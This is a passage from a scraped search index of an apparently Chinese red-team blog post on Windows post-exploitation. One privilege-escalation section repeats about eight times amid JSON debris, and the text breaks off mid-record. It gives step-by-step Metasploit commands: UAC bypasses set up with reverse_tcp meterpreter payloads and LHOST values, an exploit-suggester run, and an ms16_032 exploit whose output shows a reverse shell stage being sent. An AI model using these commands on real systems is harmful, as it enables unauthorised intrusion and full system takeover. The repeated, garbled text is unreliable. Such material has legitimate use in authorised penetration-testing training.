show options //查看需要设置的参数 ​ Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc): ​ Name Current Setting Required Description ​ ---- --------------- -------- ----------- ​ SESSION yes The session to run this module on. ​ ​ Exploit target: ​ Id Name ​ -- ---- ​ 0 Windows x86 ​ msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e set session 1 session =\u003e 1 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e exploit ​ [*] Started reverse TCP handler on 192.168.43.6:4444 [+] Compressed size: 1016 [!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell [*] Writing payload file, C:\\Users\\testuser\\AppData\\Local\\Temp\\GLDpeYcGYT.ps1... [*] Compressing script contents... [+] Compressed size: 3596 [*] Executing exploit script... __ __ ___ ___ ___ ___ ___ ___ [*] Sending stage (180291 bytes) to 192.168.43.87 ​ | V | _|_ | | _|___| |_ |_ | | |_ |_| |_| . |___| | |_ | _| |_|_|_|___|_____|___| |___|___|___| [by b33f -\u003e @FuzzySec] ​ [?] Operating system core count: 4 [\u003e] Duplicating CreateProcessWithLogonW h","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:1","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#windows提权"},{"categories":["hvv"],"content":"\rwindows提权Windows常见权限分类： * User：普通用户权限； * Administrator：管理员权限； * System：系统权限。 1.提权辅助脚本 http://bugs.hacking8.com/tiquan/```将systeminfo输出的修补程序信息填入查询可利用的漏洞，查出漏洞后可在https://github.com/SecWiki/windows-kernel-exploits/查找下载利用程序进行提权； 2.msf提权\r2.1 msf绕过UAC提权一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限 （权限为Administrator时大概率会成功，其他可能需要绕UAC） ①进程注入方式UAC use exploit/windows/local/bypassuac set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ②内存注入 use exploit/windows/local/bypassuac_injection set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ③Eventvwr注册表项 use exploit/windows/local/bypassuac_eventvwr ​ ④COM处理程序劫持 use exploit/windows/local/bypassuac_comhijack 2.2 suggester辅助脚本提权会话派发到msf meterpreter \u003e getuid //查看权限 Server username: HACK\\testuser meterpreter \u003e background //当前激活的shell切换到后台 [*] Backgrounding session 1... msf5 exploit(multi/handler) \u003e search suggester //查找辅助提权模块 ​ Matching Modules ================ ​ # Name Disclosure Date Rank Check Description ​ - ---- --------------- ---- ----- ----------- ​ 0 post/multi/recon/local_exploit_suggester normal No Multi Recon Local Exploit Suggester ​ msf5 exploit(multi/handler) \u003e use 0 msf5 post(multi/recon/local_exploit_suggester) \u003e sessions //查看会话 ​ Active sessions =============== ​ Id Name Type Information Connection ​ -- ---- ---- ----------- ---------- ​ 1 meterpreter x86/windows HACK\\testuser @ WIN-1EVLV0JUJD6 192.168.43.6:8866 -\u003e 192.168.43.87:49394 (192.168.43.87) ​ msf5 post(multi/recon/local_exploit_suggester) \u003e set session 1 //设置会话 session =\u003e 1 msf5 post(multi/recon/local_exploit_suggester) \u003e exploit ​ [*] 192.168.43.87 - Collecting local exploits for x86/windows... [*] 192.168.43.87 - 30 exploit checks are being tried... [+] 192.168.43.87 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated. [+] 192.168.43.87 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. [*] Post module execution completed //以上为查找出来的可利用的漏洞 ​ msf5 post(multi/recon/local_exploit_suggester) \u003e use exploit/windows/local/ms16_032_secondary_logon_handle_privesc //选择上面的任意一个漏洞模块进入 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e show options //查看需要设置的参数 ​ Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc): ​ Name Current Setting Required Description ​ ---- --------------- -------- ----------- ​ SESSION yes The session to run this module on. ​ ​ Exploit target: ​ Id Name ​ -- ---- ​ 0 Windows x86 ​ msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e set session 1 session =\u003e 1 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e exploit ​ [*] Started reverse TCP handler on 192.168.43.6:4444 [+] Compressed size: 1016 [!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell [*] Writing payload file, C:\\Users\\testuser\\AppData\\Local\\Temp\\GLDpeYcGYT.ps1... [*] Compressing script contents... [+] Compressed size: 3596 [*] Executing exploit script... __ __ ___ ___ ___ ___ ___ ___ [*] Sending stage (180291 bytes) to 192.168.43.87 ​ | V | _|_ | | _|___| |_ |_ | | |_ |_| |_| . |___| | |_ | _| |_|_|_|___|_____|___| |___|___|___| [by b33f -\u003e @FuzzySec] ​ [?] Operating system core count: 4 [\u003e] Duplicating CreateProcessWithLogonW h","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:1","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#1提权辅助脚本"},{"categories":["hvv"],"content":"\rwindows提权Windows常见权限分类： * User：普通用户权限； * Administrator：管理员权限； * System：系统权限。 1.提权辅助脚本 http://bugs.hacking8.com/tiquan/```将systeminfo输出的修补程序信息填入查询可利用的漏洞，查出漏洞后可在https://github.com/SecWiki/windows-kernel-exploits/查找下载利用程序进行提权； 2.msf提权\r2.1 msf绕过UAC提权一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限 （权限为Administrator时大概率会成功，其他可能需要绕UAC） ①进程注入方式UAC use exploit/windows/local/bypassuac set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ②内存注入 use exploit/windows/local/bypassuac_injection set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ③Eventvwr注册表项 use exploit/windows/local/bypassuac_eventvwr ​ ④COM处理程序劫持 use exploit/windows/local/bypassuac_comhijack 2.2 suggester辅助脚本提权会话派发到msf meterpreter \u003e getuid //查看权限 Server username: HACK\\testuser meterpreter \u003e background //当前激活的shell切换到后台 [*] Backgrounding session 1... msf5 exploit(multi/handler) \u003e search suggester //查找辅助提权模块 ​ Matching Modules ================ ​ # Name Disclosure Date Rank Check Description ​ - ---- --------------- ---- ----- ----------- ​ 0 post/multi/recon/local_exploit_suggester normal No Multi Recon Local Exploit Suggester ​ msf5 exploit(multi/handler) \u003e use 0 msf5 post(multi/recon/local_exploit_suggester) \u003e sessions //查看会话 ​ Active sessions =============== ​ Id Name Type Information Connection ​ -- ---- ---- ----------- ---------- ​ 1 meterpreter x86/windows HACK\\testuser @ WIN-1EVLV0JUJD6 192.168.43.6:8866 -\u003e 192.168.43.87:49394 (192.168.43.87) ​ msf5 post(multi/recon/local_exploit_suggester) \u003e set session 1 //设置会话 session =\u003e 1 msf5 post(multi/recon/local_exploit_suggester) \u003e exploit ​ [*] 192.168.43.87 - Collecting local exploits for x86/windows... [*] 192.168.43.87 - 30 exploit checks are being tried... [+] 192.168.43.87 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated. [+] 192.168.43.87 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. [*] Post module execution completed //以上为查找出来的可利用的漏洞 ​ msf5 post(multi/recon/local_exploit_suggester) \u003e use exploit/windows/local/ms16_032_secondary_logon_handle_privesc //选择上面的任意一个漏洞模块进入 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e show options //查看需要设置的参数 ​ Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc): ​ Name Current Setting Required Description ​ ---- --------------- -------- ----------- ​ SESSION yes The session to run this module on. ​ ​ Exploit target: ​ Id Name ​ -- ---- ​ 0 Windows x86 ​ msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e set session 1 session =\u003e 1 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e exploit ​ [*] Started reverse TCP handler on 192.168.43.6:4444 [+] Compressed size: 1016 [!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell [*] Writing payload file, C:\\Users\\testuser\\AppData\\Local\\Temp\\GLDpeYcGYT.ps1... [*] Compressing script contents... [+] Compressed size: 3596 [*] Executing exploit script... __ __ ___ ___ ___ ___ ___ ___ [*] Sending stage (180291 bytes) to 192.168.43.87 ​ | V | _|_ | | _|___| |_ |_ | | |_ |_| |_| . |___| | |_ | _| |_|_|_|___|_____|___| |___|___|___| [by b33f -\u003e @FuzzySec] ​ [?] Operating system core count: 4 [\u003e] Duplicating CreateProcessWithLogonW h","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:1","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#2msf提权"},{"categories":["hvv"],"content":"\rwindows提权Windows常见权限分类： * User：普通用户权限； * Administrator：管理员权限； * System：系统权限。 1.提权辅助脚本 http://bugs.hacking8.com/tiquan/```将systeminfo输出的修补程序信息填入查询可利用的漏洞，查出漏洞后可在https://github.com/SecWiki/windows-kernel-exploits/查找下载利用程序进行提权； 2.msf提权\r2.1 msf绕过UAC提权一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限 （权限为Administrator时大概率会成功，其他可能需要绕UAC） ①进程注入方式UAC use exploit/windows/local/bypassuac set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ②内存注入 use exploit/windows/local/bypassuac_injection set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ③Eventvwr注册表项 use exploit/windows/local/bypassuac_eventvwr ​ ④COM处理程序劫持 use exploit/windows/local/bypassuac_comhijack 2.2 suggester辅助脚本提权会话派发到msf meterpreter \u003e getuid //查看权限 Server username: HACK\\testuser meterpreter \u003e background //当前激活的shell切换到后台 [*] Backgrounding session 1... msf5 exploit(multi/handler) \u003e search suggester //查找辅助提权模块 ​ Matching Modules ================ ​ # Name Disclosure Date Rank Check Description ​ - ---- --------------- ---- ----- ----------- ​ 0 post/multi/recon/local_exploit_suggester normal No Multi Recon Local Exploit Suggester ​ msf5 exploit(multi/handler) \u003e use 0 msf5 post(multi/recon/local_exploit_suggester) \u003e sessions //查看会话 ​ Active sessions =============== ​ Id Name Type Information Connection ​ -- ---- ---- ----------- ---------- ​ 1 meterpreter x86/windows HACK\\testuser @ WIN-1EVLV0JUJD6 192.168.43.6:8866 -\u003e 192.168.43.87:49394 (192.168.43.87) ​ msf5 post(multi/recon/local_exploit_suggester) \u003e set session 1 //设置会话 session =\u003e 1 msf5 post(multi/recon/local_exploit_suggester) \u003e exploit ​ [*] 192.168.43.87 - Collecting local exploits for x86/windows... [*] 192.168.43.87 - 30 exploit checks are being tried... [+] 192.168.43.87 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated. [+] 192.168.43.87 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. [*] Post module execution completed //以上为查找出来的可利用的漏洞 ​ msf5 post(multi/recon/local_exploit_suggester) \u003e use exploit/windows/local/ms16_032_secondary_logon_handle_privesc //选择上面的任意一个漏洞模块进入 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e show options //查看需要设置的参数 ​ Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc): ​ Name Current Setting Required Description ​ ---- --------------- -------- ----------- ​ SESSION yes The session to run this module on. ​ ​ Exploit target: ​ Id Name ​ -- ---- ​ 0 Windows x86 ​ msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e set session 1 session =\u003e 1 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e exploit ​ [*] Started reverse TCP handler on 192.168.43.6:4444 [+] Compressed size: 1016 [!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell [*] Writing payload file, C:\\Users\\testuser\\AppData\\Local\\Temp\\GLDpeYcGYT.ps1... [*] Compressing script contents... [+] Compressed size: 3596 [*] Executing exploit script... __ __ ___ ___ ___ ___ ___ ___ [*] Sending stage (180291 bytes) to 192.168.43.87 ​ | V | _|_ | | _|___| |_ |_ | | |_ |_| |_| . |___| | |_ | _| |_|_|_|___|_____|___| |___|___|___| [by b33f -\u003e @FuzzySec] ​ [?] Operating system core count: 4 [\u003e] Duplicating CreateProcessWithLogonW h","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:1","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#21-msf绕过uac提权"},{"categories":["hvv"],"content":"\rwindows提权Windows常见权限分类： * User：普通用户权限； * Administrator：管理员权限； * System：系统权限。 1.提权辅助脚本 http://bugs.hacking8.com/tiquan/```将systeminfo输出的修补程序信息填入查询可利用的漏洞，查出漏洞后可在https://github.com/SecWiki/windows-kernel-exploits/查找下载利用程序进行提权； 2.msf提权\r2.1 msf绕过UAC提权一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限 （权限为Administrator时大概率会成功，其他可能需要绕UAC） ①进程注入方式UAC use exploit/windows/local/bypassuac set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ②内存注入 use exploit/windows/local/bypassuac_injection set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ③Eventvwr注册表项 use exploit/windows/local/bypassuac_eventvwr ​ ④COM处理程序劫持 use exploit/windows/local/bypassuac_comhijack 2.2 suggester辅助脚本提权会话派发到msf meterpreter \u003e getuid //查看权限 Server username: HACK\\testuser meterpreter \u003e background //当前激活的shell切换到后台 [*] Backgrounding session 1... msf5 exploit(multi/handler) \u003e search suggester //查找辅助提权模块 ​ Matching Modules ================ ​ # Name Disclosure Date Rank Check Description ​ - ---- --------------- ---- ----- ----------- ​ 0 post/multi/recon/local_exploit_suggester normal No Multi Recon Local Exploit Suggester ​ msf5 exploit(multi/handler) \u003e use 0 msf5 post(multi/recon/local_exploit_suggester) \u003e sessions //查看会话 ​ Active sessions =============== ​ Id Name Type Information Connection ​ -- ---- ---- ----------- ---------- ​ 1 meterpreter x86/windows HACK\\testuser @ WIN-1EVLV0JUJD6 192.168.43.6:8866 -\u003e 192.168.43.87:49394 (192.168.43.87) ​ msf5 post(multi/recon/local_exploit_suggester) \u003e set session 1 //设置会话 session =\u003e 1 msf5 post(multi/recon/local_exploit_suggester) \u003e exploit ​ [*] 192.168.43.87 - Collecting local exploits for x86/windows... [*] 192.168.43.87 - 30 exploit checks are being tried... [+] 192.168.43.87 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated. [+] 192.168.43.87 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. [*] Post module execution completed //以上为查找出来的可利用的漏洞 ​ msf5 post(multi/recon/local_exploit_suggester) \u003e use exploit/windows/local/ms16_032_secondary_logon_handle_privesc //选择上面的任意一个漏洞模块进入 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e show options //查看需要设置的参数 ​ Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc): ​ Name Current Setting Required Description ​ ---- --------------- -------- ----------- ​ SESSION yes The session to run this module on. ​ ​ Exploit target: ​ Id Name ​ -- ---- ​ 0 Windows x86 ​ msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e set session 1 session =\u003e 1 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e exploit ​ [*] Started reverse TCP handler on 192.168.43.6:4444 [+] Compressed size: 1016 [!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell [*] Writing payload file, C:\\Users\\testuser\\AppData\\Local\\Temp\\GLDpeYcGYT.ps1... [*] Compressing script contents... [+] Compressed size: 3596 [*] Executing exploit script... __ __ ___ ___ ___ ___ ___ ___ [*] Sending stage (180291 bytes) to 192.168.43.87 ​ | V | _|_ | | _|___| |_ |_ | | |_ |_| |_| . |___| | |_ | _| |_|_|_|___|_____|___| |___|___|___| [by b33f -\u003e @FuzzySec] ​ [?] Operating system core count: 4 [\u003e] Duplicating CreateProcessWithLogonW h","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:1","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#22-suggester辅助脚本提权"},{"categories":["hvv"],"content":"\rwindows提权Windows常见权限分类： * User：普通用户权限； * Administrator：管理员权限； * System：系统权限。 1.提权辅助脚本 http://bugs.hacking8.com/tiquan/```将systeminfo输出的修补程序信息填入查询可利用的漏洞，查出漏洞后可在https://github.com/SecWiki/windows-kernel-exploits/查找下载利用程序进行提权； 2.msf提权\r2.1 msf绕过UAC提权一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限 （权限为Administrator时大概率会成功，其他可能需要绕UAC） ①进程注入方式UAC use exploit/windows/local/bypassuac set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ②内存注入 use exploit/windows/local/bypassuac_injection set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ③Eventvwr注册表项 use exploit/windows/local/bypassuac_eventvwr ​ ④COM处理程序劫持 use exploit/windows/local/bypassuac_comhijack 2.2 suggester辅助脚本提权会话派发到msf meterpreter \u003e getuid //查看权限 Server username: HACK\\testuser meterpreter \u003e background //当前激活的shell切换到后台 [*] Backgrounding session 1... msf5 exploit(multi/handler) \u003e search suggester //查找辅助提权模块 ​ Matching Modules ================ ​ # Name Disclosure Date Rank Check Description ​ - ---- --------------- ---- ----- ----------- ​ 0 post/multi/recon/local_exploit_suggester normal No Multi Recon Local Exploit Suggester ​ msf5 exploit(multi/handler) \u003e use 0 msf5 post(multi/recon/local_exploit_suggester) \u003e sessions //查看会话 ​ Active sessions =============== ​ Id Name Type Information Connection ​ -- ---- ---- ----------- ---------- ​ 1 meterpreter x86/windows HACK\\testuser @ WIN-1EVLV0JUJD6 192.168.43.6:8866 -\u003e 192.168.43.87:49394 (192.168.43.87) ​ msf5 post(multi/recon/local_exploit_suggester) \u003e set session 1 //设置会话 session =\u003e 1 msf5 post(multi/recon/local_exploit_suggester) \u003e exploit ​ [*] 192.168.43.87 - Collecting local exploits for x86/windows... [*] 192.168.43.87 - 30 exploit checks are being tried... [+] 192.168.43.87 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated. [+] 192.168.43.87 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. [*] Post module execution completed //以上为查找出来的可利用的漏洞 ​ msf5 post(multi/recon/local_exploit_suggester) \u003e use exploit/windows/local/ms16_032_secondary_logon_handle_privesc //选择上面的任意一个漏洞模块进入 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e show options //查看需要设置的参数 ​ Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc): ​ Name Current Setting Required Description ​ ---- --------------- -------- ----------- ​ SESSION yes The session to run this module on. ​ ​ Exploit target: ​ Id Name ​ -- ---- ​ 0 Windows x86 ​ msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e set session 1 session =\u003e 1 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e exploit ​ [*] Started reverse TCP handler on 192.168.43.6:4444 [+] Compressed size: 1016 [!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell [*] Writing payload file, C:\\Users\\testuser\\AppData\\Local\\Temp\\GLDpeYcGYT.ps1... [*] Compressing script contents... [+] Compressed size: 3596 [*] Executing exploit script... __ __ ___ ___ ___ ___ ___ ___ [*] Sending stage (180291 bytes) to 192.168.43.87 ​ | V | _|_ | | _|___| |_ |_ | | |_ |_| |_| . |___| | |_ | _| |_|_|_|___|_____|___| |___|___|___| [by b33f -\u003e @FuzzySec] ​ [?] Operating system core count: 4 [\u003e] Duplicating CreateProcessWithLogonW h","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:1","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#23-烂土豆提权提权"},{"categories":["hvv"],"content":"\rwindows提权Windows常见权限分类： * User：普通用户权限； * Administrator：管理员权限； * System：系统权限。 1.提权辅助脚本 http://bugs.hacking8.com/tiquan/```将systeminfo输出的修补程序信息填入查询可利用的漏洞，查出漏洞后可在https://github.com/SecWiki/windows-kernel-exploits/查找下载利用程序进行提权； 2.msf提权\r2.1 msf绕过UAC提权一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限 （权限为Administrator时大概率会成功，其他可能需要绕UAC） ①进程注入方式UAC use exploit/windows/local/bypassuac set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ②内存注入 use exploit/windows/local/bypassuac_injection set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ③Eventvwr注册表项 use exploit/windows/local/bypassuac_eventvwr ​ ④COM处理程序劫持 use exploit/windows/local/bypassuac_comhijack 2.2 suggester辅助脚本提权会话派发到msf meterpreter \u003e getuid //查看权限 Server username: HACK\\testuser meterpreter \u003e background //当前激活的shell切换到后台 [*] Backgrounding session 1... msf5 exploit(multi/handler) \u003e search suggester //查找辅助提权模块 ​ Matching Modules ================ ​ # Name Disclosure Date Rank Check Description ​ - ---- --------------- ---- ----- ----------- ​ 0 post/multi/recon/local_exploit_suggester normal No Multi Recon Local Exploit Suggester ​ msf5 exploit(multi/handler) \u003e use 0 msf5 post(multi/recon/local_exploit_suggester) \u003e sessions //查看会话 ​ Active sessions =============== ​ Id Name Type Information Connection ​ -- ---- ---- ----------- ---------- ​ 1 meterpreter x86/windows HACK\\testuser @ WIN-1EVLV0JUJD6 192.168.43.6:8866 -\u003e 192.168.43.87:49394 (192.168.43.87) ​ msf5 post(multi/recon/local_exploit_suggester) \u003e set session 1 //设置会话 session =\u003e 1 msf5 post(multi/recon/local_exploit_suggester) \u003e exploit ​ [*] 192.168.43.87 - Collecting local exploits for x86/windows... [*] 192.168.43.87 - 30 exploit checks are being tried... [+] 192.168.43.87 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated. [+] 192.168.43.87 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. [*] Post module execution completed //以上为查找出来的可利用的漏洞 ​ msf5 post(multi/recon/local_exploit_suggester) \u003e use exploit/windows/local/ms16_032_secondary_logon_handle_privesc //选择上面的任意一个漏洞模块进入 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e show options //查看需要设置的参数 ​ Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc): ​ Name Current Setting Required Description ​ ---- --------------- -------- ----------- ​ SESSION yes The session to run this module on. ​ ​ Exploit target: ​ Id Name ​ -- ---- ​ 0 Windows x86 ​ msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e set session 1 session =\u003e 1 msf5 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) \u003e exploit ​ [*] Started reverse TCP handler on 192.168.43.6:4444 [+] Compressed size: 1016 [!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell [*] Writing payload file, C:\\Users\\testuser\\AppData\\Local\\Temp\\GLDpeYcGYT.ps1... [*] Compressing script contents... [+] Compressed size: 3596 [*] Executing exploit script... __ __ ___ ___ ___ ___ ___ ___ [*] Sending stage (180291 bytes) to 192.168.43.87 ​ | V | _|_ | | _|___| |_ |_ | | |_ |_| |_| . |___| | |_ | _| |_|_|_|___|_____|___| |___|___|___| [by b33f -\u003e @FuzzySec] ​ [?] Operating system core count: 4 [\u003e] Duplicating CreateProcessWithLogonW h","date":"2023-11-17","objectID":"/hvv_post_penetration/:1:1","series":null,"tags":["hvv"],"title":"hvv_后渗透","uri":"/hvv_post_penetration/#24-dll劫持提权"},{"categories":["hvv"],"content":"\rwindows提权Windows常见权限分类： * User：普通用户权限； * Administrator：管理员权限； * System：系统权限。 1.提权辅助脚本 http://bugs.hacking8.com/tiquan/```将systeminfo输出的修补程序信息填入查询可利用的漏洞，查出漏洞后可在https://github.com/SecWiki/windows-kernel-exploits/查找下载利用程序进行提权； 2.msf提权\r2.1 msf绕过UAC提权一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限 （权限为Administrator时大概率会成功，其他可能需要绕UAC） ①进程注入方式UAC use exploit/windows/local/bypassuac set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ②内存注入 use exploit/windows/local/bypassuac_injection set payload windows/meterpreter/reverse_tcp set LHOST=192.168.1.8 set session 1 exploit 在执行getsystem ​ ③Eventvwr注册表项 use exploit/windows/local/bypassuac_eventvwr ​ ④COM处理程序劫持 use exploit/windows/local/bypassuac_comhijack 2.2 suggester辅助脚本提权会话派发到msf meterpreter \u003e getuid //查看权限 Server username: HACK\\testuser meterpreter \u003e background //当前激活的shell切换到后台 [*] Backgrounding session 1... msf5 exploit(multi/handler) \u003e search suggester //查找辅助提权模块 ​ Matching Modules ================ ​ # Name Disclosure Date Rank Check Description ​ - ---- --------------- ---- ----- ----------- ​ 0 post/multi/recon/local_exploit_suggester normal No Multi Recon Local Exploit Suggester ​ msf5 exploit(multi/handler) \u003e use 0 msf5 post(multi/recon/local_exploit_suggester) \u003e sessions //查看会话 ​ Active sessions =============== ​ Id Name Type Information Connection ​ -- ---- ---- ----------- ---------- ​ 1 meterpreter x86/windows HACK\\testuser @ WIN-1EVLV0JUJD6 192.168.43.6:8866 -\u003e 192.168.43.87:49394 (192.168.43.87) ​ msf5 post(multi/recon/local_exploit_suggester) \u003e set session 1 //设置会话 session =\u003e 1 msf5 post(multi/recon/local_exploit_suggester) \u003e exploit ​ [*] 192.168.43.87 - Collecting local exploits for x86/windows... [*] 192.168.43.87 - 30 exploit checks are being tried... [+] 192.168.43.87 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable. [+] 192.168.43.87 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable. [+] 192.168.43.87 - 